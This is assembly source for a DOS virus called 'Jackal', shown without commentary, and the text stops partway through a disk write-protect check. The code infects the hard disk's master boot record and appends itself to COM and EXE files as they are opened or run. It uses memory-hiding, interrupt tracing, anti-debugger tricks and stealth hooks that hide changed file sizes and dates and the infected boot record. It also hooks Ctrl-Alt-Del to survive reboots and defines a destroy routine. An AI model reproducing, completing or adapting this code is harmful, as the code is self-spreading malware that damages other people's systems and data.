.model  tiny
.code


years           equ     100 shl 1

boot            equ     jump_21_boot - (origin + 1)
file            equ     jump_21_file - (origin + 1)

word_size       equ     (jackal_end - jackal + 1) / 2
para_size       equ     (jackal_end - jackal + 15) / 16
kilo_size       equ     (jackal_end - jackal + 1023) / 1024

file_size       equ     (file_end - jackal)
sect_size       equ     (file_size + 511) / 512

int_1           equ     interrupts + (4h * 1h)
int_9           equ     interrupts + (4h * 9h)
int_13          equ     interrupts + (4h * 13h)
int_15          equ     interrupts + (4h * 15h)
int_21          equ     interrupts + (4h * 21h)
int_24          equ     interrupts + (4h * 24h)
int_40          equ     interrupts + (4h * 40h)

find_dos_13     equ     tracer_dos_13 - (trace_mode + 1)
find_13         equ     tracer_13 - (trace_mode + 1)
find_15         equ     tracer_15 - (trace_mode + 1)
find_21         equ     tracer_21 - (trace_mode + 1)
find_40         equ     tracer_40 - (trace_mode + 1)
step_21         equ     tracer_step_21 - (trace_mode + 1)

int_1_iret      equ     tracer_iret - (tracer_exit + 1)
int_1_end       equ     tracer_end - (tracer_exit + 1)

jackal_id       equ     'aJ' xor 'kc' xor 'la'
marker          equ     ((1ch - 2h) shl 8) + 0ebh

no_hook_21      equ     stealth_13 - (hook_21 + 1)
yes_hook_21     equ     check_vect - (hook_21 + 1)

do_destroy      equ     destroy - (host_jump + 2)

jackal:

;=====( First 1ch bytes of infected file )===================================;

header          dw      1ch / 2 dup(?)
                org     0
                mov     word ptr ds:[100h],20cdh
                jmp     file_start
                org     1ch
                
;=====( Start here if loaded as boot sector )================================;

boot_start:     push    cs
                pop     ds
                sub     word ptr ds:[413h],kilo_size  ; hide memory
                int     12h                     ; get memory size
                mov     cl,0ah
                ror     ax,cl                   ; get address of memory
                mov     es,ax
                mov     cx,0ffh
                mov     si,7c00h
                push    si ds                   ; 0000:7c00h
                xor     di,di
                cld
                rep     movsw                   ; copy this code to high mem
                mov     ax,0                    ; at 1feh before infection
jackal_1fe      =       word ptr $ - 2
                stosw
                mov     ax,offset boot_cont
                push    es ax
                retf
boot_cont:      push    cs
                pop     ds
                mov     ax,200h + sect_size-1   ; read rest of code
                mov     bx,di                   ; 200h
                mov     cx,0
jackal_sect     =       byte ptr $ - 2          ; sector of Jackal
                mov     dx,80h
                int     13h                     ; read code
                jb      jump_boot
                call    copy_ints               ; copy ints to our code
                call    hook_boot               ; hook ints 9 and 13h
                int     12h                     ; get memory size-our size
                mov     ds:bios_mem_size,ax     ; save for reboot
jump_boot:      mov     ax,201h
                pop     es bx                   ; 0000:7c00h
                mov     cx,0
boot_sect       =       word ptr $ - 2          ; track/sector of boot sector
                mov     dh,0
boot_head       =       byte ptr $ - 1          ; head of boot sector
                int     13h
                jb      boot_fail
                push    es bx
                retf                            ; jump to boot sector

boot_fail:      int     18h

;=====( Start here if in file )==============================================;

file_start:     mov     ax,cs
                add     ax,10h                  ; get displacement
file_start_ip   =       word ptr $ - 2
                push    ax
                mov     ax,offset file_cont
                push    ax
file_retf:      retf
file_cont:      push    ds                      ; save psp segment
                push    cs
                pop     ds
                mov     ds:origin,file          ; remember origin
                mov     ds:hook_21,no_hook_21   ; do not hook int 21h
                cld
                call    anti_tbclean            ; pretty self-explanatory...
                push    cs
                pop     es
                call    copy_ints               ; copy IVT
                mov     ah,52h                  ; get lists
                int     21h
                mov     ax,es:[bx - 2]          ; get 1st mcb address
                mov     ds:dos_seg,ax
                mov     al,1h
                mov     dx,offset tracer
                call    set_int                 ; hook int 1h for tracing
                pushf
                pop     bp
                or      bp,100h                   ; TF on
                mov     ds:trace_mode,find_dos_13 ; find int 13h in DOS/BIOS
                mov     ah,1
                push    bp
                popf                            ; trapping on
                pushf
                call    ds:dos_13               ; call to DOS and BIOS
                mov     ds:trace_mode,find_15
                mov     ah,0c0h
                push    bp
                popf                            ; TF on
                pushf
                call    ds:int_15               ; locate BIOS int 15h
                mov     ds:trace_mode,find_21
                mov     ax,3001h
                push    bp
                popf                            ; TF on
                call    call_21                 ; locate Original int 21h
                mov     ds:trace_mode,find_40
                mov     ah,1
                push    bp
                popf                            ; TF on
                pushf
                call    ds:int_40               ; locate BIOS int 40h
                and     bp,not 100h             ; TF off
                push    bp
                popf
                mov     al,1
                lds     dx,ds:int_1
                call    set_int                 ; unhook int 1h
                mov     ax,3000h                ; get DOS version
                mov     bx,'aJ'
                mov     cx,'kc'
                mov     dx,'la'
                int     21h                     ; are you there?
                cmp     bx,jackal_id
                je      jump_host
                pop     ax                      ; PSP segment
                push    ax
                mov     bx,ax
                dec     ax                      ; MCB segment
                mov     ds,ax
                xor     di,di
                cmp     byte ptr ds:[di],'Z'    ; last block?
                jne     jump_host
                mov     ax,ds:[di.mcb_size]     ; get size of block
                sub     ax,para_size            ; hide memory
                jb      jump_host
                cmp     ax,1000h                ; enough left?
                jb      jump_host
                mov     ds:[di.mcb_size],ax     ; resize block
                add     ax,bx                   ; get address of block
                mov     ds:[di + 12h],ax        ; hide from PSP size
                mov     cx,word_size
                xor     si,si
                push    cs
                pop     ds
                mov     es,ax
                cld
                rep     movsw                   ; copy Jackal to high memory
                push    ax
                call    file_retf               ; jump to AX:IP+3
file_cont1:     push    cs
                pop     ds
                call    hard_infect             ; infect drive C:
                mov     di,offset jump_code_13  ; Jump to put in DOS code
                mov     al,0eah                 ; JMP xxxx:xxxx
                stosb
                mov     ds:[di + 4],al          ; store at jump_code_21 too
                mov     ax,offset jackal_13
                stosw                           ; store offset of jump
                mov     word ptr ds:[di+3],offset jackal_21  ; same for 21h
                mov     ds:[di],cs
                mov     ds:[di + 5],cs          ; same for 21h
                call    swap_13                 ; insert hook into int 13h
                call    swap_21                 ; and one into int 21h

;=====( Jump to host program )===============================================;

jump_host:      db      0e9h
host_jump       dw      0
                pop     es                      ; psp segment
                push    cs
                pop     ds
                xor     si,si
                mov     ax,ds:[si]              ; get first word
                cmp     ax,'ZM'                 ; .exe file?
                je      jump_2_exe
                cmp     ax,'MZ'                 ; .exe file?
                je      jump_2_exe
                mov     di,100h                 ; start of .COM file
                push    es di
                mov     cx,1ch / 2h
                cld
                rep     movsw                   ; restore header
                push    es
                pop     ds
                xchg    ax,cx
                retf

jump_2_exe:     mov     ax,es
                add     ax,10h
                add     ds:[si.eh_cs],ax        ; set CS displacement
                add     ax,ds:[si.eh_ss]        ; get SS
                push    es
                pop     ds
                cli
                mov     ss,ax
                mov     sp,cs:[si.eh_sp]        ; get SP
                xor     ax,ax
                sti
                jmp     dword ptr cs:[si.eh_ip]


;=====( copyright )==========================================================;

copyright:      db      'T' xor 'W'
                db      'H' xor 'A'
                db      'E' xor 'S'
                db      ' ' xor ' '
                db      'P' xor 'M'
                db      'R' xor 'A'
                db      'O' xor 'D'
                db      'G' xor 'E'
                db      'R' xor ' '
                db      'A' xor 'B'
                db      'M' xor 'Y'
                db      ' ' xor ' '
                db      'J' xor 'P'
                db      'A' xor 'R'
                db      'C' xor 'I'
                db      'K' xor 'E'
                db      'A' xor 'S'
                db      'L' xor 'T'
                db      0
copyright_end:

;=====( Infect MBR of Drive C: )=============================================;

hard_infect:    mov     bp,marker
                mov     si,0aa55h               ; valid BS marker
                mov     ax,201h
                mov     bx,offset boot_buffer
                inc     cx
                mov     dx,80h
                push    ax
                call    call_13                 ; read MBR
                pop     ax
                jb      hard_infect_err
                cmp     ds:[bx + 1feh],si       ; valid MBR?
                jne     hard_infect_err
                push    ax cx dx
                mov     cx,ds:[bx.pt_start_sector_track]
                mov     dh,ds:[bx.pt_start_head]  ; get BS location
                mov     ds:boot_sect,cx         ; save BS location
                mov     ds:boot_head,dh
                call    call_13                 ; read BS
                pop     dx cx ax
                jb      hard_infect_err
                cmp     ds:[bx],bp              ; infected?
                je      hard_infect_err
                cmp     ds:[bx + 1feh],si       ; valid BS?
                jne     hard_infect_err
                call    call_13                 ; reread MBR
                jb      hard_infect_err
                push    bx cx dx
                mov     ax,ds:[bx.pt_end_sector_track]
                and     ax,0000000000111111b    ; track zero, last head
                sub     al,sect_size            ; is there enough room?
                jbe     hard_infect_err
                cmp     al,1                    ; would it overwrite MBR?
                je      hard_infect_err
                mov     cx,ax
                inc     ax                
                mov     ds:jackal_sect,al       ; sector of Jackal's code
                mov     ax,300h + sect_size     ; write jackal to disk
                xor     bx,bx
                xchg    bp,ds:[bx]              ; put JMP boot_start at 0
                xchg    si,ds:[1feh]            ; mark us as valid BS
                mov     ds:jackal_1fe,si        ; remember value there
                call    call_13                 ; write Jackal to disk
                mov     [bx],bp                 ; restore 1st two bytes
                mov     ds:[1feh],si            ; restore value at 1feh
                mov     ds:[boot_buffer.pt_start_sector_track],cx
                mov     ds:[boot_buffer.pt_start_head],dh  ; BS = jackal
                pop     dx cx bx
                jb      hard_infect_err
                mov     ax,301h
                call    call_13                 ; rewrite MBR
hard_infect_err:retn
                
;=====( Int 9 handler )======================================================;

jackal_9:       push    ax es
                in      al,60h                  ; get key code
                cmp     al,53h                  ; DEL?
                jne     jump_9
                xor     ax,ax
                mov     es,ax                   ; segment of ROM data
                mov     al,es:[417h]            ; get keyboard flags
                and     al,00001100b            ; get Ctrl & Alt status
                cmp     al,00001100b            ; Ctrl and Alt down?
                je      reboot
jump_9:         pop     es ax
                jmp     cs:int_9

reboot:         cli
                in      al,61h
                push    ax
                or      al,80h                  ; signal key acknowledgement
                out     61h,al
                pop     ax
                out     61h,al                  ; reset port
                mov     al,20h                  ; EOI signal
                out     20h,al                  ; to Int controller 1
                out     0a0h,al                 ; to Int controller 2
                in      al,21h
                and     al,not 1                ; Timer on
                out     21h,al
                mov     cx,0ffh * 2h
                mov     si,offset interrupts
                xor     di,di
                push    cs
                pop     ds
                mov     word ptr ds:int_21,di   ; Zero int 21h address
                mov     word ptr ds:int_21+2,di
                cld
                rep     movsw                   ; restore IVT
                xchg    ax,cx
                mov     es:[417h],ax            ; zero keyboard flags
                mov     word ptr es:[413h],1234h ; reset int 12h - our size
bios_mem_size   =       word ptr $ - 2
                mov     al,3h
                int     10h                     ; video mode 3
                inc     ah
                mov     cx,607h
                int     10h                     ; reset cursor type
                call    hook_boot               ; hook 9 and 13
                mov     ax,es:[46ch]            ; get current timer
                add     ax,6
                sti
reboot_delay:   cmp     ax,es:[46ch]            ; 1/3rd of second passed?
                jne     reboot_delay                
                int     19h                     ; load OS
                
;=====( Int 13h handler )====================================================;

jackal_13:      jmp     $
hook_21         =       byte ptr $ - 1
                
check_vect:     call    push_all
                mov     al,21h
                call    get_int                 ; get address of int
                mov     ax,es
                cmp     ax,800h                 ; too high for DOS?
                ja      check_no
                push    cs cs
                pop     ds es
                mov     di,offset int_21 + 2    ; address of int 21h segment
                std
                xchg    ax,ds:[di]              ; save address, get address
                db      2eh
                scasw                           ; did it change?
                je      check_no
                mov     ds:[di],bx              ; save offset
                mov     al,21h
                mov     dx,offset jackal_21
                call    set_int                 ; hook int 21h
                mov     ds:hook_21,no_hook_21
check_no:       call    pop_all

                
stealth_13:     cmp     ah,2                    ; read?
                jne     jump_13
                cmp     cx,1                    ; track 0, sector 1?
                jne     jump_13
                or      dh,dh                   ; head zero?
                je      hide_mbr
jump_13:        call    call_dos_13             ; call int 13h for caller
                retf    2h

hide_mbr:       call    call_dos_13             ; call int 13h to read MBR
                call    push_all
                jb      hide_mbr_err
                push    cs es
                pop     ds es
                mov     di,bx
                cmp     word ptr ds:[di+1feh],0aa55h ; is it a valid MBR
                jne     hide_mbr_err
                mov     ax,201h
                mov     bx,offset boot_buffer
                mov     cx,ds:[di.pt_start_sector_track] ; get BS location
                cmp     cx,0000000000111111b    ; track zero?
                ja      hide_mbr_err
                mov     dh,ds:[di.pt_start_head]
                or      dh,dh                   ; head 0?
                jne     hide_mbr_err
                call    call_13                 ; read BS
                jb      hide_mbr_err
                cmp     word ptr es:[bx],marker ; infected?
                jne     hide_mbr_err
                mov     ax,cs:[bx + boot_sect]
                mov     ds:[di.pt_start_sector_track],ax ; hide infection
                mov     al,cs:[bx + boot_head]
                mov     ds:[di.pt_start_head],al
hide_mbr_err:   call    pop_all
                retf    2h


;=====( Int 21h handler )====================================================;

jackal_21:      call    push_all
                push    cs
                pop     ds
                mov     ds:handle,bx            ; save file handle
                in      al,21h
                or      al,2                    ; keybaord off
                out     21h,al
                mov     al,24h
                call    get_int                 ; get address of int 24h
                mov     word ptr ds:int_24,bx
                mov     word ptr ds:int_24+2,es ; save int 24h address
                mov     dx,offset jackal_24
                call    set_int                 ; hook int 24h
                call    pop_all
                call    swap_21                 ; remove jump from int 21h
                call    push_all
                cld
                mov     bp,sp
                cmp     ax,3000h                ; possibly 'are you there'?
                jne     is_dir_fcb
                xor     bx,cx
                xor     bx,dx
                cmp     bx,jackal_id            ; looking for us?
                je      are_you_there
                jmp     jump_21

are_you_there:  mov     ss:[bp.reg_bx],bx       ; save return
                jmp     iret_21
                
is_dir_fcb:     cmp     ah,11h                  ; find FCB?
                je      dir_fcb
                cmp     ah,12h                  ; find next FCB?
                jne     is_dir_asciiz
dir_fcb:        call    call_21                 ; do find
                or      al,al
                je      dir_fcb_ok
                jmp     jump_21

dir_fcb_ok:     mov     ss:[bp.reg_ax],ax       ; save returns
                mov     si,dx                   ; offset of FCB entry
                mov     ah,2fh
                call    call_21                 ; get DTA address
                lodsb                           ; get extended signature
                inc     al                      ; ZF set if extended
                jne     dir_fcb_next
                add     bx,7                    ; fix offsets
dir_fcb_next:   lea     di,ds:[bx.ds_date + 1]  ; get address of date entry
hide_size:      push    es
                pop     ds
                mov     al,ds:[di]              ; get date
                sub     al,years                ; infected?
                jb      iret_21
                stosb                           ; save new date
                les     ax,ds:[bx.ds_size]      ; get file size
                sub     ax,file_size            ; hide increase
                mov     cx,es
                sbb     cx,0                    ; hide remainder
                jb      iret_21
                mov     word ptr ds:[bx.ds_size],ax
                mov     word ptr ds:[bx.ds_size+2],cx ; save old size

;=====( return directly to caller )==========================================;

iret_21:        in      al,21h
                and     al,not 2                ; keyboard on
                out     21h,al
                mov     al,24h
                lds     dx,cs:int_24
                call    set_int                 ; unhook int 24h
                call    pop_all
                call    swap_21                 ; insert jump into int 21h
                retf    2h

is_dir_asciiz:  cmp     ah,4eh                  ; find file ASCIIZ?
                je      dir_asciiz
                cmp     ah,4fh                  ; find next file?
                jne     is_read
dir_asciiz:     call    call_21                 ; do call
                jnb     dir_asciiz_ok
                jmp     jump_21

dir_asciiz_ok:  mov     ss:[bp.reg_ax],ax
                pushf
                pop     ss:[bp.reg_f]           ; save returns
                mov     ah,2fh
                call    call_21                 ; get DTA address
                lea     di,ds:[bx.dta_date + 1] ; get offset of date
                sub     bx,3                    ; align BX with FCB structure
                jmp     hide_size


is_read:        cmp     ah,3fh                  ; read file?
                je      do_read
no_read:        jmp     is_write

do_read:        call    get_dcb                 ; get DCB address
                jb      no_read
                cmp     byte ptr ds:[di.dcb_date+1],years ; infected?
                jb      no_read
                les     ax,ds:[di.dcb_size]     ; get size of file
                sub     ax,file_size            ; get size before infection
                mov     bx,es
                sbb     bx,0
                les     dx,ds:[di.dcb_pos]      ; get current position
                mov     si,es
                push    ax bx
                sub     ax,dx
                sbb     bx,si                   ; is current pos in virus?
                pop     bx ax
                jnb     read_into
                xor     cx,cx                   ; if it is, then read 0 bytes
                push    si
                jmp     read_fake1

read_into:      push    si dx
                add     dx,cx                   ; get position after read
                adc     si,0
                cmp     si,bx                   ; below virus?
                jb      read_fake
                ja      read_high
                cmp     dx,ax                   ; above virus?
                jb      read_fake
read_high:      pop     dx                      ; get current position
                mov     cx,ax
                sub     cx,dx                   ; # of bytes to read
read_fake1:     push    dx
read_fake:      push    ax bx ds                ; save size/dcb seg
                mov     ah,3fh
                mov     dx,ss:[bp.reg_dx]
                mov     ds,ss:[bp.reg_ds]
                call    call_21_file            ; read file size
                pop     ds bx cx dx si
                jnb     read_low
                jmp     jump_21

read_low:       mov     ss:[bp.reg_ax],ax
                pushf
                pop     ss:[bp.reg_f]           ; save returns
                or      si,si                   ; in first 64k ?
                jne     read_low_no
                cmp     dx,1ch                  ; read first 1ch bytes?
                jnb     read_low_no
                or      ax,ax                   ; read 0 bytes?
                je      read_low_no
                push    ax
                add     ax,dx                   ; get position after read
                cmc
                jnc     read_above_head
                cmp     ax,1ch                  ; did it read above header?
read_above_head:pop     ax
                jb      read_fake_low
                mov     ax,1ch                  ; number of bytes to read
                sub     ax,dx                   ; subtract position in header
read_fake_low:  xchg    ax,cx
                test    al,0fh                  ; already on paragraph?
                je      read_low_para
                and     al,0f0h                 ; paragraph align position
                add     ax,10h                  ; to next paragraph
                adc     bx,0
read_low_para:  add     ax,dx                   ; get position in header
                adc     bx,0
                xchg    ax,word ptr ds:[di.dcb_pos]  ; lseek to header
                xchg    bx,word ptr ds:[di.dcb_pos+2]
                push    ax bx ds
                mov     ah,3fh
                mov     dx,ss:[bp.reg_dx]
                mov     ds,ss:[bp.reg_ds]       ; get buffer address
                call    call_21_file            ; read original header
                pop     ds
                pop     word ptr ds:[di.dcb_pos+2]
                pop     word ptr ds:[di.dcb_pos] ; restore postion
read_low_no:    jmp     iret_21

                
is_write:       cmp     ah,40h                  ; write?
                je      do_write
no_write:       jmp     is_lseek

do_write:       call    get_dcb                 ; get DCB address
                jb      no_write
                cmp     byte ptr ds:[di.dcb_date+1],years  ; infected?
                jb      no_write
                les     ax,ds:[di.dcb_size]     ; get size of file
                sub     ax,file_size            ; subtract our size
                mov     bx,es
                sbb     bx,0
                les     dx,ds:[di.dcb_pos]      ; get current position
                mov     si,es
                or      si,si                   ; in first 64k?
                jne     write_to_end
                cmp     dx,1ch                  ; writing to header?
                jb      write_disinfect
write_to_end:   add     dx,cx                   ; position after write
                adc     si,0
                cmp     bx,si                   ; in same 64k?
                ja      write_disinfect
                jb      no_write_dis
                cmp     ax,dx                   ; write above virus?
                ja      no_write_dis
write_disinfect:mov     dx,ds:[di.dcb_mode]     ; get access mode
                push    dx
                and     dl,11111100b
                or      dl,2                    ; read/write
                mov     ds:[di.dcb_mode],dx
                push    ax bx                   ; size before infection
                test    al,0fh                  ; on paragraph?
                je      write_para
                and     al,0f0h                 ; paragraph align position
                add     ax,10h
                adc     bx,0
write_para:     xchg    ax,word ptr ds:[di.dcb_pos] ; lseek to original header
                xchg    bx,word ptr ds:[di.dcb_pos+2]
                push    ax bx
                mov     ah,3fh
                mov     cx,1ch
                xor     dx,dx
                push    ds cs
                pop     ds es
                call    call_21_file            ; read original header
                jnb     write_head
write_dis_err:  push    es
                pop     ds
                pop     word ptr ds:[di.dcb_pos+2]
                pop     word ptr ds:[di.dcb_pos] ; restore position
                pop     bx ax                   ; size of file
                pop     ds:[di.dcb_mode]        ; restore access mode
no_write_dis:   jmp     jump_21                

write_head:     sub     ax,cx                   ; 1ch bytes read?
                jne     write_dis_err
                mov     word ptr es:[di.dcb_pos],ax ; lseek to start
                mov     word ptr es:[di.dcb_pos+2],ax
                mov     ah,40h
                call    call_21_file            ; write original header
                jb      write_dis_err
                sub     ax,cx
                jne     write_dis_err
                push    es
                pop     ds
                pop     word ptr ds:[di.dcb_pos+2]
                pop     word ptr ds:[di.dcb_pos]  ; restore position
                pop     word ptr ds:[di.dcb_size+2]
                pop     word ptr ds:[di.dcb_size] ; truncate size
                pop     ds:[di.dcb_mode]          ; restore access mode
                sub     byte ptr ds:[di.dcb_date+1],years ; restore date
                jmp     jump_21


is_lseek:       cmp     ax,4202h                ; Lseek to end?
                jne     is_date
                call    call_21_file            ; do lseek
                jnb     is_lseek_ok
                jmp     jump_21

is_lseek_ok:    pushf
                pop     ss:[bp.reg_f]           ; save returns
                call    get_dcb                 ; get DCB addess
                jb      is_lseek_end
                cmp     byte ptr ds:[di.dcb_date+1],years ; infected?
                jb      is_lseek_end
                sub     ax,file_size            ; hide size increase
                sbb     dx,0
                mov     word ptr ds:[di.dcb_pos],ax
                mov     word ptr ds:[di.dcb_pos+2],dx ; lseek to size-vsize
is_lseek_end:   mov     ss:[bp.reg_ax],ax
                mov     ss:[bp.reg_dx],dx       ; save new position
                jmp     iret_21


is_date:        cmp     ah,57h                  ; get/set date?
                jne     is_infect
                cmp     al,1                    ; set date?
                jb      get_date
                je      set_date
date_err:       jmp     jump_21

set_date:       dec     ax                      ; get date
                push    cx dx
                call    call_21_file            ; get date of file
                pop     ax cx
                jb      date_err
                cmp     dh,years                ; infected?
                jb      date_err
                cmp     ah,years                ; already marked?
                jnb     date_err
                add     ah,years                ; dont let it erase marker
                xchg    ax,dx
                mov     ax,5701h                ; set date again
get_date:       call    call_21_file            ; get/set date
                jb      date_err
                pushf
                pop     ss:[bp.reg_f]           ; return flags
                cmp     dh,years                ; infected?
                jb      date_ret
                sub     dh,years
date_ret:       mov     ss:[bp.reg_ax],ax
                mov     ss:[bp.reg_cx],cx
                mov     ss:[bp.reg_dx],dx       ; save returns
                jmp     iret_21


is_infect:      cmp     ah,3dh                  ; Open file?
                je      infect_open
                cmp     ah,6ch                  ; Extended open file?
                je      infect_open
                cmp     ax,4b00h                ; Execute program?
                je      infect_exec
                cmp     ah,3eh                  ; Close file?
                je      infect_dup
                jmp     jump_21

infect_dup:     mov     ah,45h                  ; get duplicate of handle
                jmp     infect_open

infect_exec:    mov     ax,3d00h                ; Open function
infect_open:    call    hook_disk               ; set 13h, 15h and 40h to ROM
                call    call_21                 ; Open file
                jnb     infect_got_hdl
                call    hook_disk               ; restore int 13h, 15h & 40h
                jmp     jump_21

infect_got_hdl: mov     cs:handle,ax            ; save handle of file
                call    get_dcb                 ; get DCB address
                jb      no_infect
                cmp     byte ptr ds:[di.dcb_date+1],years ; infected?
                jnb     no_infect
                call    is_protect              ; is disk write-protected?
                jb      no_infect
                xor     ax,ax                   ; new attribute
                xchg    al,ds:[di.dcb_attr]     ; set attr, get attr
                push    ax
                test    al,00000100b            ; system file?
                jne     infect_attr
                mov     al,2h                   ; read/write access mode
                xchg    ax,ds:[di.dcb_mode]     ; set mode, get mode
                push    ax
                push    ds:[di.dcb_time]        ; get time
                push    ds:[di.dcb_date]        ; get date
                xor     ax,ax
                xchg    ax,word ptr ds:[di.dcb_pos] ; lseek to start
                push    ax
                xor     ax,ax
                xchg    ax,word ptr ds:[di.dcb_pos+2]
                push    ax
                push    ds:[di.dcb_dev_attr]
                xor     bp,bp                       ; BP=zero if unknown file
                cmp     word ptr ds:[di.dcb_ext],'OC'  ; COm?
                jne     not_com
                cmp     byte ptr ds:[di.dcb_ext+2],'M' ; coM?
                jne     not_com
                dec     bp                      ; BP=-1 if COM
not_com:        call    infect_file             ; do actual infection
                pop     ax                      ; device attribute
                pushf
                call    get_dcb                 ; get DCB address
                mov     byte ptr ds:[di.dcb_dev_attr+1],ah ; restore update flag
                popf
                jb      infect_close
                push    ds
                call    up_count                ; update counter
                pop     ds
                add     byte ptr ds:[di.dcb_date+1],years ; mark as infected
                or      byte ptr ds:[di.dcb_dev_attr+1],40h ; update time/date
infect_close:   pop     word ptr ds:[di.dcb_pos+2]
                pop     word ptr ds:[di.dcb_pos] ;
                pop     ax                      ; Old date
                jnb     infect_date
                mov     ds:[di.dcb_date],ax     ; restore date if error
infect_date:    pop     ds:[di.dcb_time]
                pop     ds:[di.dcb_mode]        ; restore mode
infect_attr:    pop     ax                      ; attribute
                mov     ds:[di.dcb_attr],al
no_infect:      mov     ah,3eh
                call    call_21_file            ; close file
                call    hook_disk               ; restore ints 13h, 15h & 40h
                
;=====( Jump on to int 21h )=================================================;

jump_21:        in      al,21h
                and     al,not 2                ; keyboard on
                out     21h,al
                mov     al,24h
                lds     dx,cs:int_24
                call    set_int                 ; unhook int 24h
                push    cs
                pop     ds
                jmp     $
origin          =       byte ptr $ - 1

jump_21_file:   mov     al,1
                call    get_int                 ; get address of int 1
                mov     word ptr ds:int_1,bx
                mov     word ptr ds:int_1 + 2,es
                mov     ds:trace_mode,step_21   ; trace into int 21h
                mov     ds:inst_count,5         ; trace 5 instruction
                mov     dx,offset tracer
                call    set_int                 ; hook int 1
                call    pop_all
                push    ax
                pushf
                pop     ax
                or      ah,1                    ; TF on
                push    ax
                popf
                pop     ax
jump_21_go:     jmp     cs:int_21

jump_21_boot:   call    pop_all
                jmp     jump_21_go


;=====( Append Jackal's code to file )=======================================;

infect_file:    les     si,ds:[di.dcb_size]     ; get size of file
                mov     di,es
                mov     ah,3fh
                mov     cx,1ch
                xor     dx,dx
                push    cs cs
                pop     ds es
                call    call_21_file            ; read header of file
                jnb     inf_is_exe
infect_head_err:stc
                retn

inf_is_exe:     cmp     ax,cx                   ; 1ch bytes read?
                jne     infect_head_err
                push    si di
                xor     si,si
                mov     di,offset temp_header
                mov     bx,di
                rep     movsw                   ; make copy of header
                pop     di si
                mov     ax,ds:[header]          ; get 1st word                
                cmp     ax,'ZM'                 ; .exe file?
                je      inf_exe
                cmp     ax,'MZ'                 ; .exe file?
                je      inf_exe
                inc     bp                      ; if ZF set, then COM file
                jne     infect_head_err
                or      di,di                   ; too big for .COM file?
                jne     infect_head_err
                cmp     si,0-(file_size+1000)   ; still too big?
                ja      infect_head_err
                cmp     si,1000                 ; too small?
                jb      infect_head_err
                call    com_check_inst          ; is it a trap file?
                je      infect_head_err
                mov     byte ptr ds:[bx],0e9h   ; JMP instruction
                add     si,100h                 ; PSP size
                call    para_align              ; paragraph align address
                call    get_dcb                 ; get DCB address
                sub     word ptr ds:[di.dcb_pos],100h ; -PSP size
                push    cs
                pop     ds
                push    si
                mov     cl,4
                shr     si,cl                   ; get CS displacement
                mov     ds:file_start_ip,si     ; save displacement
                pop     si
                add     si,((file_start-jackal)-3)-100h
                mov     ds:[bx + 1],si          ; set JMP displacement
                jmp     append_jackal

inf_exe:        cmp     ds:[bx.eh_max_mem],0ffffh ; requesting all of memory?
                jne     infect_head_err
                mov     ax,si
                mov     dx,di                   ; size of .EXE
                mov     cx,200h
                div     cx                      ; divide into pages
                or      dx,dx
                je      inf_exe_noup
                inc     ax
inf_exe_noup:   cmp     ds:[bx.eh_size],ax      ; size ok?
                jne     append_err
                cmp     ds:[bx.eh_modulo],dx    ; modulo ok?
                jne     append_err
                or      dx,dx                   ; Need to up it?
                jne     inf_exe_noup1
                inc     ax                      ; add one to adjust load size
inf_exe_noup1:  call    para_align              ; paragraph align code
                add     ax,file_size / 512      ; add our size
                add     dx,1234h                ; add remainder
exe_file_mod    =       word ptr $ - 2
                cmp     dh,1                    ; did it go above 1ffh?
                jbe     inf_exe_noupmod
                inc     ax
inf_exe_noupmod:and     dh,1                    ; 0-1ffh
                mov     ds:[bx.eh_size],ax
                mov     ds:[bx.eh_modulo],dx    ; save new size
                mov     cx,4h
                mov     ax,ds:[bx.eh_size_header] ; get size of header
                xor     dx,dx
inf_exe_header: shl     ax,1                    ; get size of header in bytes
                rcr     dx,1
                loop    inf_exe_header
                sub     si,ax
                sbb     di,dx                   ; get CS:IP of infection
                mov     bp,0-(file_size+2000)
inf_exe_ip:     cmp     si,bp                   ; IP too high?
                jb      inf_exe_ip_ok
                sub     si,10h                  ; one paragraph down
                loop    inf_exe_ip              ; one segment up
inf_exe_ip_ok:  cmp     di,0fh                  ; CS: too high to infect?
                ja      append_err
                xchg    ax,cx
                mov     cl,4
                ror     di,cl                   ; high size to seg displacement
                sub     di,ax                   ; add extra paragraphs
                jb      append_err
                push    si
                shr     si,cl                   ; get IP/4
                mov     ds:file_start_ip,si     ; save CS displacement
                pop     si
                mov     ds:[bx.eh_ip],si        ; save new IP
                add     ds:[bx.eh_ip],file_start-jackal
                mov     ds:[bx.eh_cs],di        ; save new CS
                push    si                      ; save IP
                sub     si,bp                   ; get Stack
                and     si,-2                   ; make it even
                mov     ds:[bx.eh_sp],si        ; save SP
                sub     di,10h                  ; down to next paragraph
                mov     ds:[bx.eh_ss],di        ; save SS
                sar     bp,cl                   ; # of paragraphs to add
                sub     ds:[bx.eh_min_mem],bp   ; make more memory availible
                pop     si                      ; IP of Jackal
                jb      append_jackal
append_err:     stc
                retn

append_jackal:  mov     ah,40h
                mov     cx,0
write_size      =       word ptr $ - 2          ; number of bytes to write
                xor     dx,dx
                call    call_21_file            ; append jackal to file
                jb      append_err
                sub     ax,cx
                jne     append_err
                call    get_dcb                 ; get DCB address again
                mov     word ptr ds:[di.dcb_pos],ax
                mov     word ptr ds:[di.dcb_pos+2],ax ; lseek to start
                mov     ah,40h
                mov     cx,1ch
                mov     dx,offset temp_header
                push    cs
                pop     ds
                call    call_21_file            ; write new header to file
                jb      append_err
                sub     ax,cx
                jne     append_err
                retn
                
;=====( Make sure .COM file is not a dummy file )============================;

com_check_inst: push    di
                mov     di,offset bad_com_inst  ; array of bad instructions
                mov     cl,7
                repne   scasb                   ; is it a bad file?
                je      com_check_bad
                mov     cl,3
                repne   scasw                   ; check for exit inst.
                je      com_check_bad
                scasb                           ; is it MOV AX,xxxx?
                jne     com_check_bad
                mov     al,byte ptr ds:header+2 ; get High byte
                scasb                           ; is it MOV AX,09xxh?
                je      com_check_bad
                scasb                           ; is it MOV AX,4Cxxh? 
com_check_bad:  pop     di
                retn
                
;=====( COM files are not infected if they begin with one of these inst. )===;

bad_com_inst:   db      0
                nop
                hlt
                cmc
                clc
                stc
                retn
                int     20h
                mov     ah,09h
                mov     ah,4ch
                mov     ax,0h
                org     $ - 2
                db      09h, 4ch                                    

;=====( Check to see if disk is write-protected )============================;

is_protect:     mov     dx,ds:[di.dcb_dev_attr]
                test    dh,10000000b            ; is handle remote?
                jne     is_protect_no
                and     dx,00111111b            ; get drive code only
                mov     bl,dl
                inc     bx                      ; 0=default, 1=a, 2=b, etc.
                mov     ax,4408h                ; is drive removeable?
                call    call_21
                jnb     is_prot_test
                cmp     ah,1                    ; invalid function?
                je      is_protect_no
is_protect_yes: stc
                retn

is_prot_test:   dec     ax                      ; ZF set if fixed
                je      is_protect_no
                mov     ax,201h
